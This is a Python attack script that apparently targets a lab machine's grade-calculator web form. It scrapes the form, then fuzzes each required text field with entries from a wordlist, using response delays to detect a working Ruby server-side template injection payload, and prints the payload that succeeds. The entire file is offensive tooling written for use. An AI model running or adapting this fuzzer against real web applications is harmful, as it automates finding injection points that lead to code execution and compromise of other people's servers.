#!/usr/bin/env python3


import sys
import argparse
import random
import time
import requests 
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from urllib.parse import urlencode

# move to separate function but keep generic in main

def main():
  session = requests.Session()

  url = "http://10.10.11.253/weighted-grade"
  response = session.get(url)
  
  soup = BeautifulSoup(response.text, "html.parser")
  
  form = soup.find("form")
  action = form.get("action")
  post_url = urljoin(url, action)
  print("This is the post URL: ", post_url)
  
  payload = {}

  
  for input_tag in form.find_all("input"):
      name = input_tag.get("name")
      value = input_tag.get("value", "")
  
      if name:
          payload[name] = value
      if not value and input_tag.get("type") == "number" and input_tag.has_attr("required"):
          payload[name] = 20

      if not value and input_tag.get("type") == "text" and input_tag.has_attr("required"):
          payload[name] = "test"

  with open("wordlist.txt") as f:
    for x in f:
      for k, v in payload.items():
        if payload[k] == "test":
            temp = payload[k]
            payload[k] = "FUZZVALUE"
            encoded = urlencode(list(payload.items()))
            encoded = encoded.replace('FUZZVALUE', x.strip())

            start = time.monotonic()
            post_response = session.post(post_url, data=encoded, timeout=60)
            elapsed = time.monotonic() - start

            if elapsed > 5:
                print(f"⚠️ Slow response successuful Ruby SSTI: {elapsed:.2f}s")
                print("Full Payload:", encoded)
                print("payload: ", x)
                sys.exit()
            payload[k] = temp
            print(post_response.status_code)
#            print(post_response.text)
        else:
            continue


if __name__=="__main__":
    main()

